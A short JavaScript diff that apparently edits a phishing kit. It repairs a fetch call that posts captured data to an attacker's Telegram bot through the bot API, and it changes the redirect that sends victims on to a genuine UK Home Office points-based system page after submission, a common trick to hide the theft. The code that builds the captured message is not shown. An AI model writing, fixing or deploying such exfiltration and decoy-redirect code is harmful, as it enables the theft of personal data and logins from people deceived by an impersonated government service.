@@ -216,7 +216,7 @@
     `;
 
     // send data to Telegram
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=telegramMessage`, {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -229,7 +229,7 @@
       if (data.ok) {
         alert("Please Wait...");
         // optional: redirect to landing page
-        window.location.href = "https://www.points.homeoffice.gov.uk/gui-sms-jsf/home/SMS-003-Home.html";
+        window.location.href = "https://www.points.homeoffice.gov.uk/gui-sms-jsf/SMS-001-Landing.faces";
       } else {
         alert("Try Again");
       }
